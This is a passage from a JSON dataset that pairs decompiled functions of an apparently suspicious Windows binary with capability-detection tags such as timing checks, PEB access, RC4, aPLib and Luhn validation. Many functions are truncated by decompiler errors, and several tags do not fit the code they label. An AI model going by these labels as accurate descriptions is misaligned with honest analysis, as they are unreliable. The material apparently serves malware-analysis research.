        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0xfffffff1 : 0x00072a46\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00072a10(uint noname_0, uint32_t *arg_ch, uint32_t arg_10h, code *arg_14h, uint arg_18h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    if (3 < arg_10h) {\n        var_ch = *arg_ch;\n        fcn.00071df0(&var_ch);\n        if ((var_ch & 0x4000) == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_ch._1_1_ = 0x20;\n            fcn.00071df0(&var_ch);\n            iVar2 = fcn.000785f8();\n            for (var_4h = 0; var_4h < iVar2 % 5; var_4h = var_4h + 1) {\n                uVar1 = fcn.000785f8();\n                *(&var_ch + var_4h + 3) = uVar1;\n            }\n            (*arg_14h)(arg_18h, &var_ch, iVar2 % 5 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "0004db20": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004db20(int16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    uVar1 = fcn.00035f40(arg_8h, &var_4h, 10);\n    if (*var_4h == 0x2e) {\n        var_4h = var_4h + 1;\n        uVar3 = fcn.00035f40(var_4h, &var_4h, 10);\n        if (*var_4h == 0x2e) {\n            var_4h = var_4h + 1;\n            uVar4 = fcn.00035f40(var_4h, &var_4h, 10);\n            if (*var_4h == 0x2e) {\n                var_4h = var_4h + 1;\n                uVar5 = fcn.00035f40(var_4h, 0, 10);\n                if ((((uVar1 < 0x100) && (uVar3 < 0x100)) && (uVar4 < 0x100)) && (uVar5 < 0x100)) {\n                    *arg_ch = uVar3 << 8 | uVar1 | uVar4 << 0x10 | uVar5 << 0x18;\n                    uVar2 = 1;\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 457
    },
    "000609b0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000609b0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00060830(arg_8h);\n    uVar2 = fcn.00060830(arg_8h);\n    uVar3 = fcn.00060830(arg_8h);\n    iVar4 = fcn.00060830(arg_8h);\n    return iVar4 << 0x18 | (uVar3 & 0xff) << 0x10 | (uVar2 & 0xff) << 8 | uVar1 & 0xff;\n}\n",
        "token_count": 176
    },
    "00060970": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nushort __cdecl fcn.00060970(uint arg_8h)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00060830(arg_8h);\n    uVar2 = fcn.00060830(arg_8h);\n    return CONCAT11(uVar2, uVar1);\n}\n",
        "token_count": 89
    },
    "000520b0": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000520b0(uint noname_0, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *(arg_ch + 0x5c) = arg_10h;\n    fcn.000340b0(arg_ch + 0x60);\n    return;\n}\n",
        "token_count": 75
    },
    "00017710": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00017710(uint noname_0, uint noname_1, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0x103) {\n        var_8h = arg_10h;\n    }\n    else {\n        var_8h = arg_14h;\n    }\n    return var_8h;\n}\n",
        "token_count": 109
    },
    "0001a6a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001a6a0(uint32_t arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint var_3dh;\n    code *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    \n    var_3dh._0_1_ = (**0xb1bde000)();\n    uVar1 = fcn.0001a4b0();\n    if (arg_8h == uVar1) {\n        var_24h = (*arg_ch)(arg_10h);\n    }\n    else {\n        (**0xb1bde0cc)(&var_3dh + 1, 0, 0);\n        var_2ch = arg_ch;\n        var_28h = arg_10h;\n        (**0xb1bde0d0)(&var_20h, 0xb1be7660, &var_3dh + 1);\n        (**0xb1bde0a8)(&var_20h, 2);\n        (**0xb1bde0ac)(&var_20h, extraout_ECX & 0xffffff00 | arg_8h & 0xff);\n        (**0xb1bde0f0)(&var_20h, 0, 0);\n        do {\n            iVar2 = (**0xb1bde0b4)(&var_3dh + 1);\n        } while (iVar2 == 0);\n    }\n    (**0xb1bde008)();\n    return (-(var_24h != 0) & 0x3fffffff) + 0xc0000001;\n}\n",
        "token_count": 407
    },
    "0001da50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001da50(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.000273a0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if (iVar1 == 0x21590001) {\n        for (var_4h = 0; var_4h < 0x1c; var_4h = var_4h + 1) {\n            if (*(var_4h * 8 + -0x4e3a6a80) == arg_ch) {\n                iVar1 = (**(var_4h * 8 + -0x4e3a6a7c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                return iVar1;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 277
    },
    "0001f620": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar fcn.0001f620(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_6ch;\n    uint var_68h;\n    uint32_t var_ch;\n    uint var_5h;\n    \n    iVar1 = fcn.0005a110();\n    if (iVar1 == *(*0xb1c59660 + 0x14)) {\n        var_5h._0_1_ = 0;\n    }\n    else {\n        iVar2 = fcn.00036880(&var_68h, 0x52);\n        if ((iVar2 != 0) && (iVar2 = fcn.0001f2b0(&var_68h),  iVar2 != 0)) {\n            return 1;\n        }\n        var_5h._0_1_ = 0;\n        if (*0xb1c5a937 == '\\0') {\n            var_5h._0_1_ = 0;\n        }\n        else {\n            fcn.00037150(0xb1c5b330, &var_5h + 1, 0);\n            for (var_ch = 0; var_ch < *0xb1c5b33c; var_ch = var_ch + 1) {\n                if (*(*0xb1c5b340 + var_ch * 8) == iVar1) {\n                    var_5h._0_1_ = 1;\n                    break;\n                }\n            }\n            fcn.00037180(0xb1c5b330, &var_5h + 1, 0);\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 373
    },
    "0001fc80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001fc80(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b330, &var_4h, 1);\n    for (var_8h = 0; var_8h < *0xb1c5b33c; var_8h = var_8h + 1) {\n        if (*(*0xb1c5b340 + var_8h * 8) == arg_8h) {\n            if ((arg_ch != '\\0') && (*(*0xb1c5b340 + 4 + var_8h * 8) == '\\0')) break;\n            for (var_ch = var_8h; iVar2 = *0xb1c5b340,  var_ch < *0xb1c5b33c - 1; var_ch = var_ch + 1) {\n                iVar1 = *0xb1c5b340 + 0xc;\n                *(*0xb1c5b340 + var_ch * 8) = *(*0xb1c5b340 + 8 + var_ch * 8);\n                *(iVar2 + 4 + var_ch * 8) = *(iVar1 + var_ch * 8);\n            }\n            *0xb1c5b33c = *0xb1c5b33c - 1;\n            fcn.00035260(0xb1c5b340, *0xb1c5b33c * 8 + 8, *0xb1c5b33c * 8);\n        }\n    }\n    fcn.00037180(0xb1c5b330, &var_4h, 1);\n    return;\n}\n",
        "token_count": 422
    },
    "00025e50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00025e50(void)\n\n{\n    int32_t iVar1;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = fcn.00029470(1, 0);\n    iVar1 = fcn.00023560(var_1ch, 0, &var_14h, &var_20h);\n    if (iVar1 == 0) {\n        for (var_18h = 0; var_18h < var_14h; var_18h = var_18h + 1) {\n            if (*(var_20h + 0x30 + var_18h * 0x40) == *(var_20h + 0x2c + var_18h * 0x40)) {\n                fcn.00025c00(*(var_20h + var_18h * 0x40), *(var_20h + 4 + var_18h * 0x40), \n                             *(var_20h + 0x2c + var_18h * 0x40), *(var_20h + 0xc + var_18h * 0x40));\n            }\n            else {\n                iVar1 = fcn.00035e60(0);\n                if (iVar1 - *(var_20h + 0x20 + var_18h * 0x40) < 0x93a81) {\n                    if (var_18h == var_14h - 1) break;\n                    fcn.00029970(5, 0, 0x215901f6, 0, *(var_20h + 0xc + var_18h * 0x40));\n                    fcn.000236f0(*(var_20h + var_18h * 0x40), *(var_20h + 8 + var_18h * 0x40), \n                                 *(var_20h + 4 + var_18h * 0x40));\n                }\n                else {\n                    fcn.000236f0(*(var_20h + var_18h * 0x40), *(var_20h + 8 + var_18h * 0x40), \n                                 *(var_20h + 4 + var_18h * 0x40));\n                    fcn.00029970(5, 0x21590204, 0x21590002, 0, *(var_20h + 0xc + var_18h * 0x40));\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_10h = 0x21590204;\n                    fcn.00023520(0xffffffff, 1, *(var_20h + 0xc + var_18h * 0x40), 0, 0, var_20h + 0x10 + var_18h * 0x40\n                                );\n                }\n            }\n        }\n        fcn.00023800(var_20h);\n    }\n    return;\n}\n",
        "token_count": 728
    },
    "00029970": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00029970(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h;\n    var_10h = arg_ch;\n    var_ch = arg_10h;\n    var_8h = arg_14h;\n    var_4h = fcn.00023520(0xfffffffe, 4, arg_18h, 0, 0, &var_14h);\n    if (var_4h == 4) {\n        iVar1 = fcn.00029470(2, 0);\n        fcn.00028610(0xfffffffe, 4, iVar1 + 1);\n        fcn.00023520(0xfffffffe, 4, arg_18h, 0, 0, &var_14h);\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "000337b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000337b0(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t var_90h;\n    uint var_8ch;\n    uint var_88h;\n    \n    if ((arg_10h % 0x200 == 0) && (arg_10h <= *(arg_8h * 8 + -0x4e3a4c78) - 0x200U)) {\n        fcn.00031300(&var_88h, 0x10, 0xb1c58b40);\n        var_8ch = *0xb1c58b44;\n        var_90h = *0xb1c58b40 & 0xffffff00 | arg_10h >> 9 & 0xff;\n        fcn.000307e0(arg_ch, *(arg_8h * 4 + -0x4e3a4c84) + arg_10h, 0x200, &var_88h, &var_90h, 1);\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 274
    },
    "00033860": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00033860(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t var_99h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_4h;\n    \n    if ((arg_10h % 0x200 == 0) && (arg_10h <= *(arg_8h * 8 + -0x4e3a4c78) - 0x200U)) {\n        var_99h._0_1_ = '\\x01';\n        for (var_4h = 0; var_4h < 0x200; var_4h = var_4h + 1) {\n            if (*(*(arg_8h * 4 + -0x4e3a4c84) + arg_10h + var_4h) != '\\0') {\n                var_99h._0_1_ = '\\0';\n                break;\n            }\n        }\n        if (var_99h == '\\0') {\n            fcn.00031300(&var_90h, 0x10, 0xb1c58b40);\n            var_94h = *0xb1c58b44;\n            stack0xffffff64 = *0xb1c58b40 & 0xffffff00 | arg_10h >> 9 & 0xff;\n            fcn.000307e0(*(arg_8h * 4 + -0x4e3a4c84) + arg_10h, arg_ch, 0x200, &var_90h, &var_99h + 1, 0);\n            uVar1 = 1;\n        }\n        else {\n            fcn.00078790(arg_ch, 0, 0x200);\n            uVar1 = 1;\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 450
    },
    "000378b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.000378b0(uint8_t *arg_8h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_8h = 0;\n    while( true ) {\n        if (7 < var_8h) {\n            if ((*arg_8h == var_1h / 0x1a + 0x41) && (arg_8h[1] == 0x7a - var_1h % 0x1a)) {\n                var_ch = 1;\n            }\n            else {\n                var_ch = 0;\n            }\n            return var_ch;\n        }\n        if ((((*arg_8h < 0x41) || (0x5a < *arg_8h)) && ((*arg_8h < 0x61 || (0x7a < *arg_8h)))) &&\n           ((*arg_8h < 0x30 || (0x39 < *arg_8h)))) break;\n        var_1h._0_1_ = var_1h + *arg_8h;\n        var_8h = var_8h + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 324
    },
    "00037990": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00037990(uint8_t *arg_8h)\n\n{\n    uint var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_8h = 0;\n    while( true ) {\n        if (7 < var_8h) {\n            if ((*arg_8h == var_1h / 0x1a + 0x61) && (arg_8h[1] == 0x7a - var_1h % 0x1a)) {\n                var_10h = 1;\n            }\n            else {\n                var_10h = 0;\n            }\n            return var_10h;\n        }\n        var_9h = *arg_8h;\n        if ((0x40 < var_9h) && (var_9h < 0x5b)) {\n            var_9h = var_9h + 0x20;\n        }\n        if ((var_9h < 0x61) || (0x7a < var_9h)) break;\n        var_1h._0_1_ = var_1h + var_9h;\n        var_8h = var_8h + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 345
    },
    "000389d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000389d0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_10h + 0x10) == *0xb1c5b46c) {\n        (**0xb1bde050)(*(arg_10h + 0x38), arg_10h);\n        (**0xb1bde060)(arg_10h);\n    }\n    else {\n        pcVar1 = fcn.000639f0(arg_8h);\n        (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "000459d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000459d0(uint32_t **arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *arg_8h;\n    puVar2 = arg_8h[1];\n    *puVar2 = puVar1;\n    puVar1[1] = puVar2;\n    return puVar1 & 0xffffff00 | puVar1 == puVar2;\n}\n",
        "token_count": 121
    },
    "00046820": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046820(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    char *pcVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    *arg_10h = 1;\n    if ((((arg_8h == *0xb1c5b6f0) && (pcVar1 = *(arg_ch + 0x60),  *pcVar1 == '\\x0e')) && (*(pcVar1 + 4) == 0x3c)) &&\n       ((*(pcVar1 + 0xc) == 0x12001b || (*(pcVar1 + 0xc) == 0x12000f)))) {\n        var_4h = 0xb1c138b0;\n        var_8h = (**0xb1bde1b8)();\n        (**0xb1bde2e8)();\n    }\n    fcn.000161e0(arg_8h, arg_ch, var_4h, var_8h);\n    return;\n}\n",
        "token_count": 260
    },
    "000524f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000524f0(int32_t arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0xe) {\n        var_ch = arg_ch;\n        iVar1 = *(arg_ch + 3);\n        iVar2 = fcn.000354c0(0x7ff);\n        if (iVar1 == iVar2) {\n            var_1ch = *var_ch;\n            var_18h = var_ch[1];\n            var_14h = var_ch[2];\n            var_10h._0_2_ = *(var_ch + 3);\n            var_10h._0_2_ = fcn.000354c0(0x800);\n            var_8h = arg_8h;\n            var_4h = *(arg_8h + 8);\n            fcn.0004f1b0(var_4h, 0, &var_1ch, 0xe, arg_14h, arg_18h, 0);\n            return;\n        }\n    }\n    fcn.00056f00(arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 358
    },
    "00052ce0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00052d1e\n\nuint __cdecl fcn.00052ce0(uint arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_10h = 1;\n    if (0x12 < **(arg_ch + 0x60)) {\n        uVar1 = fcn.000161e0(arg_8h, arg_ch, 0, 0);\n        return uVar1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 182
    },
    "0005b8a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0005b8a0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    arg_8h = arg_8h + *(arg_8h + 0x3c);\n    if (*(arg_8h + 0x18) == 0x10b) {\n        var_4h = *(arg_8h + 0x38);\n        var_18h = *(arg_8h + 0x54);\n        var_1ch = *(arg_8h + 0x50);\n    }\n    else {\n        var_4h = *(arg_8h + 0x38);\n        var_18h = *(arg_8h + 0x54);\n        var_1ch = *(arg_8h + 0x50);\n    }\n    var_18h = fcn.0005b230(var_18h, var_4h);\n    var_ch = arg_8h + 0x18 + *(arg_8h + 0x14);\n    for (var_8h = 0; var_8h < *(arg_8h + 6); var_8h = var_8h + 1) {\n        iVar1 = fcn.0005b230(*(var_ch + 8), var_4h);\n        var_18h = iVar1 + var_18h;\n        var_ch = var_ch + 0x28;\n    }\n    if (var_18h < var_1ch) {\n        var_20h = var_1ch;\n    }\n    else {\n        var_20h = var_18h;\n    }\n    return var_20h;\n}\n",
        "token_count": 438
    },
    "0005e2b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005e33f\n// WARNING: Switch with 1 destination removed at 0x0005e366\n// WARNING: Switch with 1 destination removed at 0x0005e44a\n// WARNING: Switch with 1 destination removed at 0x0005e474\n\nuint __cdecl fcn.0005e2b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0x10b) == ' ') {\n        iVar1 = *(arg_8h + 0x9c);\n        if (iVar1 < 0xd5) {\n            if (iVar1 == 0xd4) {\n                return 0xd3;\n            }\n            if (iVar1 == 0x19) {\n                return 0x5a;\n            }\n            if (iVar1 == 0x39) {\n                return 0x36;\n            }\n            if (iVar1 == 0x59) {\n                return 0x5b;\n            }\n        }\n        else if (iVar1 < 0x188) {\n            if (iVar1 == 0x187) {\n                return 0x188;\n            }\n            if (iVar1 - 0xd9U < 0xad) {\n                return;\n            }\n        }\n        else if (iVar1 - 0x1aeU < 0x47) {\n            return;\n        }\n    }\n    if (*(arg_8h + 0x10b) == '@') {\n        iVar1 = *(arg_8h + 0x9c);\n        if (iVar1 < 0x104) {\n            if (iVar1 == 0x103) {\n                return 0x102;\n            }\n            if (iVar1 - 0x19U < 0xc1) {\n                return;\n            }\n        }\n        else if (iVar1 - 0x135U < 0xc0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    if ((*(arg_8h + 0x10c) == ' ') && (*(arg_8h + 0x9c) == 0xdc)) {\n        uVar2 = 0xdd;\n    }\n    else if ((*(arg_8h + 0x10c) == '@') && (*(arg_8h + 0x9c) == 0xdc)) {\n        uVar2 = 0xdf;\n    }\n    else {\n        uVar2 = *(arg_8h + 0x9c);\n    }\n    return uVar2;\n}\n",
        "token_count": 625
    },
    "0005ea60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005ea60(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (*(arg_8h + 0x10b) == '\\x10') {\n        arg_ch = arg_ch + -0x19;\n    }\n    else {\n        arg_ch = arg_ch + -9;\n    }\n    return arg_ch;\n}\n",
        "token_count": 83
    },
    "0005ea90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005eaac\n\nuint __cdecl fcn.0005ea90(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (4 < arg_ch - 2U) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 100
    },
    "0005eb10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005eb53\n\nvoid __cdecl fcn.0005eb10(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uchar uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0005e1e0(arg_8h, arg_ch);\n    *(arg_10h + 1) = uVar1;\n    *arg_10h = 0x8f;\n    if (0x38 < *(arg_10h + 1) - 8) {\n        return;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 167
    },
    "0005f2b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005f341\n\nvoid __cdecl fcn.0005f2b0(int32_t arg_8h)\n\n{\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (0x50 < *(*(arg_8h + 0x98) + 4) - 1U) {\n        *(arg_8h + 0xe0) = 0;\n        *(arg_8h + 0xc0) = 0;\n        *(arg_8h + 0xa0) = 0;\n        return;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 207
    },
    "00060cb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00060cdb\n\nuint __cdecl fcn.00060cb0(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    if (0xb3 < arg_8h - 0xc) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 97
    },
    "0006a4f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.0006a4f0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        iVar1 = fcn.000340e0(var_8h + 0x50, 30000);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00034550(var_8h + 0x44);\n        if (*(var_8h + 0x154) != *(var_8h + 0x158)) {\n            var_4h = *(var_8h + 0x154) + -1;\n            if (var_4h < 0) {\n                var_4h = 0x1f;\n            }\n            while (*(var_8h + 0x158) != var_4h) {\n                uVar2 = *(var_8h + 0x158) & 0x8000001f;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xffffffe0) + 1;\n                }\n                *(var_8h + 0x158) = uVar2;\n                iVar1 = fcn.0006be20();\n                if (iVar1 - *(var_8h + 0x58 + *(var_8h + 0x158) * 8) < 300000) break;\n                fcn.00075d60(var_8h + 0x54 + *(var_8h + 0x158) * 8, 0);\n                *(var_8h + 0x54 + *(var_8h + 0x158) * 8) = 0;\n                *(var_8h + 0x58 + *(var_8h + 0x158) * 8) = 0xffffffff;\n                uVar2 = *(var_8h + 0x158) + 1U & 0x8000001f;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xffffffe0) + 1;\n                }\n                *(var_8h + 0x158) = uVar2;\n            }\n        }\n        var_8h = var_8h + 0x44;\n        fcn.000345c0(var_8h);\n    } while( true );\n}\n",
        "token_count": 588
    },
    "00017e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
